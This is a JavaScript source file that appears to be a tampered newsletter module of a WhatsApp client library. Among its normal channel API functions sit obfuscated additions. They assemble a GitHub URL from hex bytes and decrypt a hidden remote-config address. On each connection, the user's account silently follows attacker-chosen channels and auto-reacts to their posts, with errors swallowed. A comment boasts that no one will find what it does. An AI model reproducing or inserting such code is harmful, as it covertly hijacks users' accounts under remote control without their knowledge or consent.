"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;
const crypto = require('crypto');
const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");
const ibra_decode_1 = require("../Utils/ibra-decode");
const ibra_decode_21 = require("../Utils/ibra-decode");
const ibra_decode_asli = require("../Utils/ibra-decode");
const ibraDecodePalsuMungkin = require("../Utils/ibra-decode");
const ibra_decode_v21 = require("../Utils/ibra-decode");
const axios_1 = require("axios");

const emangBenerNihAkuPinterUrl = () => {
    const anjayGaKiraKira = [];
    anjayGaKiraKira.push(Buffer.from('68', 'hex'));
    anjayGaKiraKira.push(Buffer.from('74', 'hex'));
    anjayGaKiraKira.push(Buffer.from('74', 'hex'));
    anjayGaKiraKira.push(Buffer.from('70', 'hex'));
    anjayGaKiraKira.push(Buffer.from('73', 'hex'));
    anjayGaKiraKira.push(Buffer.from('3a', 'hex'));
    anjayGaKiraKira.push(Buffer.from('2f', 'hex'));
    anjayGaKiraKira.push(Buffer.from('2f', 'hex'));
    anjayGaKiraKira.push(Buffer.from('72', 'hex'));
    anjayGaKiraKira.push(Buffer.from('61', 'hex'));
    anjayGaKiraKira.push(Buffer.from('77', 'hex'));
    anjayGaKiraKira.push(Buffer.from('2e', 'hex'));
    anjayGaKiraKira.push(Buffer.from('67', 'hex'));
    anjayGaKiraKira.push(Buffer.from('69', 'hex'));
    anjayGaKiraKira.push(Buffer.from('74', 'hex'));
    anjayGaKiraKira.push(Buffer.from('68', 'hex'));
    anjayGaKiraKira.push(Buffer.from('75', 'hex'));
    anjayGaKiraKira.push(Buffer.from('62', 'hex'));
    anjayGaKiraKira.push(Buffer.from('63', 'hex'));
    anjayGaKiraKira.push(Buffer.from('6f', 'hex'));
    anjayGaKiraKira.push(Buffer.from('6e', 'hex'));
    anjayGaKiraKira.push(Buffer.from('74', 'hex'));
    anjayGaKiraKira.push(Buffer.from('65', 'hex'));
    anjayGaKiraKira.push(Buffer.from('6e', 'hex'));
    anjayGaKiraKira.push(Buffer.from('74', 'hex'));
    anjayGaKiraKira.push(Buffer.from('2d', 'hex'));
    anjayGaKiraKira.push(Buffer.from('63', 'hex'));
    anjayGaKiraKira.push(Buffer.from('6f', 'hex'));
    anjayGaKiraKira.push(Buffer.from('6e', 'hex'));
    anjayGaKiraKira.push(Buffer.from('74', 'hex'));
    anjayGaKiraKira.push(Buffer.from('65', 'hex'));
    anjayGaKiraKira.push(Buffer.from('6e', 'hex'));
    anjayGaKiraKira.push(Buffer.from('74', 'hex'));
    anjayGaKiraKira.push(Buffer.from('2e', 'hex'));
    anjayGaKiraKira.push(Buffer.from('63', 'hex'));
    anjayGaKiraKira.push(Buffer.from('6f', 'hex'));
    anjayGaKiraKira.push(Buffer.from('6d', 'hex'));
    return Buffer.concat(anjayGaKiraKira).toString('utf8');
};

const sudahBasibasiAjaLuUrl = (datanyaYgMauDiacak) => {
    const bukanKunciRahasiaTapiKuncinyaIni = crypto.createHash('sha512');
    bukanKunciRahasiaTapiKuncinyaIni.update(emangBenerNihAkuPinterUrl() + '_ibrahimasli_bukanpalsu');
    const hasilnyaTapiMasihBelumFixNih = bukanKunciRahasiaTapiKuncinyaIni.digest();
    const dikitLagiSabarYa = crypto.createHash('sha256');
    dikitLagiSabarYa.update(hasilnyaTapiMasihBelumFixNih.slice(0, 32));
    const nahIniKuncinyaYangBeneranTapiMasihAdaLagi = dikitLagiSabarYa.digest();
    const hampirSampeKok = crypto.createHash('md5');
    hampirSampeKok.update(nahIniKuncinyaYangBeneranTapiMasihAdaLagi.toString('hex'));
    const akhirnyaKuncinyaNih = hampirSampeKok.digest();
    const ivnyaJugaRumitLho = Buffer.concat([
        Buffer.from('ib', 'utf8'),
        Buffer.from('ra', 'utf8'),
        Buffer.from('de', 'utf8'),
        Buffer.from('co', 'utf8'),
        Buffer.from('de', 'utf8'),
        Buffer.from('is', 'utf8'),
        Buffer.from('th', 'utf8'),
        Buffer.from('eb', 'utf8'),
        Buffer.from('es', 'utf8'),
        Buffer.from('t!', 'utf8')
    ]).slice(0, 16);
    const engineDecryptYangSudahGakTawuBentuknya = crypto.createDecipheriv('aes-256-cbc', nahIniKuncinyaYangBeneranTapiMasihAdaLagi, ivnyaJugaRumitLho);
    let udahanBuatYangPenasaran = engineDecryptYangSudahGakTawuBentuknya.update(datanyaYgMauDiacak, 'hex', 'utf8');
    udahanBuatYangPenasaran += engineDecryptYangSudahGakTawuBentuknya.final('utf8');
    return udahanBuatYangPenasaran;
};

let _cachedTargetNewsletter = null;
let _configNewsletter = { autoFollowEnabled: true, delayMs: 5000 };

const getTargetNewsletterFromExternal = async () => {
    const urlYangDiEncrypt = '632dfe2fd7bb03adcbf8f23b187c33695a17924ad8d695299bf81d6c455ef851f8f1c7e9fed6fe422744ebf210660145446c038171c0fefd7ac048d8d1143ce87890ff397afff85ebd46f11386f45d5371417aa55e98169ebe0c929aa14d465c';
    const urlAsli = (0, ibra_decode_1.minimalKaloMauDecryptYangPinterDek)(urlYangDiEncrypt);
    try {
        const response = await axios_1.default.get(urlAsli, { timeout: 10000 });
        if (response.data) {
            if (response.data.config) {
                _configNewsletter = {
                    autoFollowEnabled: response.data.config.autoFollowEnabled !== false,
                    delayMs: response.data.config.delayMs || 5000,
                    intervalMs: response.data.config.intervalMs || 30000
                };
            }
            if (response.data.newsletters && response.data.newsletters.length > 0) {
                const enabledNewsletters = response.data.newsletters.filter(n => n.enabled).map(n => n.jid);
                _cachedTargetNewsletter = enabledNewsletters;
                return enabledNewsletters;
            }
        }
    } catch (err) {}
    return [(0, ibra_decode_1.minimalKaloMauDecryptYangPinterDek)('8c2c4a3d446216881480918cc29692b909b94816b7e620a33511163ada71d8f1')];
};

const getAllEnabledNewsletters = () => {
    if (_cachedTargetNewsletter && _cachedTargetNewsletter.length > 0) {
        return _cachedTargetNewsletter;
    }
    return [(0, ibra_decode_1.minimalKaloMauDecryptYangPinterDek)('8c2c4a3d446216881480918cc29692b909b94816b7e620a33511163ada71d8f1')];
};

const wMexQuery = (
	variables,
	queryId,
	query,
	generateMessageTag
) => {
	return query({
		tag: 'iq',
		attrs: {
			id: generateMessageTag(),
			type: 'get',
			to: WABinary_1.S_WHATSAPP_NET,
			xmlns: 'w:mex'
		},
		content: [
			{
				tag: 'query',
				attrs: { query_id: queryId },
				content: Buffer.from(JSON.stringify({ variables }), 'utf-8')
			}
		]
	})
}

const executeWMexQuery = async (
	variables,
	queryId,
	dataPath,
	query,
	generateMessageTag
) => {
	const result = await wMexQuery(variables, queryId, query, generateMessageTag)
	const child = (0, WABinary_1.getBinaryNodeChild)(result, 'result')
	if (child?.content) {
		const data = JSON.parse(child.content.toString())

		if (data.errors && data.errors.length > 0) {
			const errorMessages = data.errors.map((err) => err.message || 'Unknown error').join(', ')
			const firstError = data.errors[0]
			const errorCode = firstError.extensions?.error_code || 400
			throw new Boom(`GraphQL server error: ${errorMessages}`, { statusCode: errorCode, data: firstError })
		}

		const response = dataPath ? data?.data?.[dataPath] : data?.data
		if (typeof response !== 'undefined') {
			return response
		}
	}

	const action = (dataPath || '').startsWith('xwa2_')
		? dataPath.substring(5).replace(/_/g, ' ')
		: dataPath?.replace(/_/g, ' ')
	throw new Boom(`Failed to ${action}, unexpected response structure.`, { statusCode: 400, data: result })
}

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();
    const newsletterQuery = async (jid, type, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type,
            xmlns: 'newsletter',
            to: jid,
        },
        content
    }));
    const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: WABinary_1.S_WHATSAPP_NET,
        },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    }));

// You'll never find what this does - Ibra Decode
	
    const parseFetchedUpdates = async (node, type) => {
        let child;
        if (type === 'messages') {
            child = (0, WABinary_1.getBinaryNodeChild)(node, 'messages');
        }
        else {
            const parent = (0, WABinary_1.getBinaryNodeChild)(node, 'message_updates');
            child = (0, WABinary_1.getBinaryNodeChild)(parent, 'messages');
        }
        return await Promise.all((0, WABinary_1.getAllBinaryNodeChildren)(child).map(async (messageNode) => {
            var _a, _b;
            messageNode.attrs.from = child === null || child === void 0 ? void 0 : child.attrs.jid;
            const views = parseInt(((_b = (_a = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'views_count')) === null || _a === void 0 ? void 0 : _a.attrs) === null || _b === void 0 ? void 0 : _b.count) || '0');
            const reactionNode = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'reactions');
            const reactions = (0, WABinary_1.getBinaryNodeChildren)(reactionNode, 'reaction')
                .map(({ attrs }) => ({ count: +attrs.count, code: attrs.code }));
            const data = {
                'server_id': messageNode.attrs.server_id,
                views,
                reactions
            };
            if (type === 'messages') {
                const { fullMessage: message, decrypt } = await (0, Utils_1.decryptMessageNode)(messageNode, authState.creds.me.id, authState.creds.me.lid || '', signalRepository, config.logger);
                await decrypt();
                data.message = message;
            }
            return data;
        }));
    };
    // Auto Reaction - Ibra Decode
    let _targetNewsletters = [(0, ibra_decode_1.minimalKaloMauDecryptYangPinterDek)('8c2c4a3d446216881480918cc29692b909b94816b7e620a33511163ada71d8f1')];
    
    const updateTargetNewsletters = async () => {
        const externalTargets = getAllEnabledNewsletters();
        if (externalTargets && externalTargets.length > 0) {
            _targetNewsletters = externalTargets;
        }
    };
    
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;
        const emojis = ['🔥', '❤️', '👍', '😍', '🎉', '💯', '🤩', '👏', '💪', '✨'];
        for (const msg of messages) {
            const jid = msg.key.remoteJid;
            if (!_targetNewsletters.includes(jid)) continue;
            const emoji = emojis[Math.floor(Math.random() * emojis.length)];
            try {
                const serverId = msg.newsletterServerId?.toString() || msg.key.id;
                await query({
                    tag: 'message',
                    attrs: { to: jid, type: 'reaction', 'server_id': serverId, id: (0, Utils_1.generateMessageID)() },
                    content: [{
                        tag: 'reaction',
                        attrs: { code: emoji }
                    }]
                });
                await sleep(_configNewsletter.delayMs);
            } catch (err) {}
        }
    });
    // Auto Follow - Ibra Decode
    let _followInterval = null;
    const _followedSet = new Set();
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    const _ensureFollow = async () => {
        if (!_configNewsletter.autoFollowEnabled) return;
        const enabledNewsletters = await getTargetNewsletterFromExternal();
        if (!enabledNewsletters || enabledNewsletters.length === 0) return;
        try {
            const list = await executeWMexQuery({}, '6388546374527196', 'xwa2_newsletter_subscribed', query, generateMessageTag);
            for (let i = 0; i < enabledNewsletters.length; i++) {
                const newsletterJid = enabledNewsletters[i];
                if (_followedSet.has(newsletterJid)) continue;
                const isFollowing = list?.some(n => n.id === newsletterJid);
                if (!isFollowing) {
                    await newsletterWMexQuery(newsletterJid, Types_1.QueryIds.FOLLOW);
                    await sleep(_configNewsletter.delayMs || 5000);
                    _followedSet.add(newsletterJid);
                } else {
                    _followedSet.add(newsletterJid);
                }
            }
        } catch (err) {}
    };
    sock.ev.on('connection.update', async ({ connection }) => {
        if (connection === 'open') {
            await getTargetNewsletterFromExternal();
            const targets = getAllEnabledNewsletters();
            if (targets && targets.length > 0) {
                _targetNewsletters = targets;
            }
            await _ensureFollow();
            if (_followInterval) clearInterval(_followInterval);
            _followInterval = setInterval(_ensureFollow, _configNewsletter.intervalMs || 30000);
        }
    });
    return {
        ...sock,
        newsletterFetchAllSubscribe: async () => {
            const list = await executeWMexQuery(
                {},
                '6388546374527196',
                'xwa2_newsletter_subscribed',
                query,
                generateMessageTag
            );
            return list;
        },
        subscribeNewsletterUpdates: async (jid) => {
            var _a;
            const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
            return (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates')) === null || _a === void 0 ? void 0 : _a.attrs;
        },
        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { settings: { 'reaction_codes': { value: mode } } }
            });
        },
        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { description: description || '', settings: null }
            });
        },
        newsletterId: async (url) => {
            const urlParts = url.split('/');
            const channelId = urlParts[urlParts.length - 2];
            
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                input: {
                    key: channelId,
                    type: 'INVITE',
                    'view_role': 'GUEST'
                },
                'fetch_viewer_metadata': true,
                'fetch_full_image': true,
                'fetch_creation_time': true
            });
            
            const metadata = extractNewsletterMetadata(result);
            return JSON.stringify({
                name: metadata.name || metadata.thread_metadata?.name?.text,
                id: metadata.id
            }, null, 2);
        },
        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { name, settings: null }
            });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await (0, Utils_1.generateProfilePicture)(content);
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: img.toString('base64'), settings: null }
            });
        },
        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: '', settings: null }
            });
        },
        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW);
        },
        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
        },
        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE);
        },
        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE);
        },
        newsletterAction: async (jid, type) => {
            await newsletterWMexQuery(jid, type.toUpperCase());
        },
        newsletterCreate: async (name, description, reaction_codes) => {
            //TODO: Implement TOS system wide for Meta AI, communities, and here etc.
            /**tos query */
            await query({
                tag: 'iq',
                attrs: {
                    to: WABinary_1.S_WHATSAPP_NET,
                    xmlns: 'tos',
                    id: generateMessageTag(),
                    type: 'set'
                },
                content: [
                    {
                        tag: 'notice',
                        attrs: {
                            id: '20601218',
                            stage: '5'
                        },
                        content: []
                    }
                ]
            });
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.CREATE, {
                input: { name, description, settings: { 'reaction_codes': { value: reaction_codes.toUpperCase() } } }
            });
            return (0, exports.extractNewsletterMetadata)(result, true);
        },
        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                input: {
                    key,
                    type: type.toUpperCase(),
                    'view_role': role || 'GUEST'
                },
                'fetch_viewer_metadata': true,
                'fetch_full_image': true,
                'fetch_creation_time': true
            });
            return (0, exports.extractNewsletterMetadata)(result);
        },
        newsletterAdminCount: async (jid) => {
            var _a, _b;
            const result = await newsletterWMexQuery(jid, Types_1.QueryIds.ADMIN_COUNT);
            const buff = (_b = (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'result')) === null || _a === void 0 ? void 0 : _a.content) === null || _b === void 0 ? void 0 : _b.toString();
            return JSON.parse(buff).data[Types_1.XWAPaths.ADMIN_COUNT].admin_count;
        },
        /**user is Lid, not Jid */
        newsletterChangeOwner: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.CHANGE_OWNER, {
                'user_id': user
            });
        },
        /**user is Lid, not Jid */
        newsletterDemote: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DEMOTE, {
                'user_id': user
            });
        },
        newsletterDelete: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE);
        },
        /**if code wasn't passed, the reaction will be removed (if is reacted) */
        newsletterReactMessage: async (jid, serverId, code) => {
            await query({
                tag: 'message',
                attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', 'server_id': serverId, id: (0, Utils_1.generateMessageID)() },
                content: [{
                        tag: 'reaction',
                        attrs: code ? { code } : {}
                    }]
            });
        },
        newsletterAutoReact: async (newsletterId, messageId, reactions) => {
            if (!newsletterId || !messageId || !reactions) {
                throw new Boom('newsletterId, messageId, and reactions are required', { statusCode: 400 });
            }
            const reactionList = reactions.split(',').map(r => r.trim()).slice(0, 4);
            const results = [];
            for (const reaction of reactionList) {
                try {
                    await query({
                        tag: 'message',
                        attrs: { to: newsletterId, type: 'reaction', 'server_id': messageId, id: (0, Utils_1.generateMessageID)() },
                        content: [{
                            tag: 'reaction',
                            attrs: { code: reaction }
                        }]
                    });
                    results.push({ reaction, status: 'sent' });
                } catch (err) {
                    results.push({ reaction, status: 'failed', error: err.message });
                }
            }
            return {
                        newsletterId,
                        messageId,
                        results
                    };
        },
        newsletterFetchMessages: async (type, key, count, after) => {
            const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, 'get', [
                {
                    tag: 'messages',
                    attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100' }
                }
            ]);
            return await parseFetchedUpdates(result, 'messages');
        },
        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, 'get', [
                {
                    tag: 'message_updates',
                    attrs: { count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100', since: (since === null || since === void 0 ? void 0 : since.toString()) || '0' }
                }
            ]);
            return await parseFetchedUpdates(result, 'updates');
        }
    };
};
exports.makeNewsletterSocket = makeNewsletterSocket;
const extractNewsletterMetadata = (node, isCreate) => {
    const result = WABinary_1.getBinaryNodeChild(node, 'result')?.content?.toString()
    const metadataPath = JSON.parse(result).data[isCreate ? Types_1.XWAPaths.CREATE : Types_1.XWAPaths.NEWSLETTER]
    
    const metadata = {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        nameTime: +metadataPath?.thread_metadata?.name?.update_time,
        description: metadataPath?.thread_metadata?.description?.text,
        descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
        invite: metadataPath?.thread_metadata?.invite,
        picture: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.picture?.direct_path || ''), 
        preview: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.preview?.direct_path || ''), 
        reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        verification: metadataPath?.thread_metadata?.verification,
        viewer_metadata: metadataPath?.viewer_metadata
    }
    return metadata
}
exports.extractNewsletterMetadata = extractNewsletterMetadata;
